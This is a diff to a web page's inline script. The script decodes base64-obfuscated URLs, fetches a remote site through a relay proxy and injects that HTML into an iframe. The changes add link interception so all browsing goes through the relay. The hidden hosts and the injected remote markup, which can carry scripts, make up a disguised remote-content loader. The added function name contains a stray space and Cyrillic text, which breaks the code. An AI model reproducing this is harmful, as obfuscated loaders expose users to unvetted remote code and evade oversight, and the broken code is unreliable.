@@ -22,26 +22,63 @@ html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#111;color:#
     const A = _0x4f("aHR0cHM6Ly9uZXR3b3JrLW5pbmUtYWxwaGEudmVyY2VsLmFwcA=="); 
     const B = _0x4f("aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==");
 
-    const C = A + "/api/relay?url=" + encodeURIComponent(B);
+    const iframe = document.getElementById("x1");
+    const loader = document.getElementById("x2");
 
-    fetch(C).then(function(D){
-        if(!D.ok) throw new Error("x");
-        return D.text();
-    }).then(function(E){
-        document.getElementById("x2").style.display="none";
+    // Function to load a URL through the proxy and inject it into the iframe
+    function loadUrl черезProxy(targetUrl) {
+        loader.style.display = "block";
+        loader.innerText = "Loading...";
 
-        let F = E;
-        if(F.indexOf("<head>")!==-1){
-            F = F.replace("<head>","<head><base href=\"" + B + "/\">");
-        } else {
-            F = "<base href=\"" + B + "/\">" + F;
-        }
+        const C = A + "/api/relay?url=" + encodeURIComponent(targetUrl);
 
-        document.getElementById("x1").srcdoc = F;
-    }).catch(function(G){
-        console.log("x",G);
-        document.getElementById("x2").innerText="Failed.";
-    });
+        fetch(C).then(function(D){
+            if(!D.ok) throw new Error("x");
+            return D.text();
+        }).then(function(E){
+            loader.style.display = "none";
+
+            // Resolve relative paths correctly based on the targetUrl being loaded
+            let baseTag = '<base href="' + targetUrl + '">';
+            if(E.indexOf("<head>") !== -1){
+                E = E.replace("<head>", "<head>" + baseTag);
+            } else {
+                E = baseTag + E;
+            }
+
+            iframe.srcdoc = E;
+
+            // Wait for iframe to render, then attach click interceptors to its internal links
+            iframe.onload = function() {
+                try {
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    
+                    iframeDoc.addEventListener("click", function(event) {
+                        let target = event.target;
+                        // Find closest anchor tag if an element inside a link was clicked
+                        while (target && target.tagName !== "A") {
+                            target = target.parentElement;
+                        }
+
+                        if (target && target.href) {
+                            event.preventDefault();
+                            // Resolve relative links against the current targetUrl
+                            let absoluteUrl = new URL(target.getAttribute('href'), targetUrl).href;
+                            loadUrl черезProxy(absoluteUrl);
+                        }
+                    });
+                } catch(err) {
+                    console.log("Cross-origin restriction prevented attaching click listener:", err);
+                }
+            };
+        }).catch(function(G){
+            console.log("x", G);
+            loader.innerText = "Failed.";
+        });
+    }
+
+    // Initial load
+    loadUrl черезProxy(B);
 })();
 </script>
 
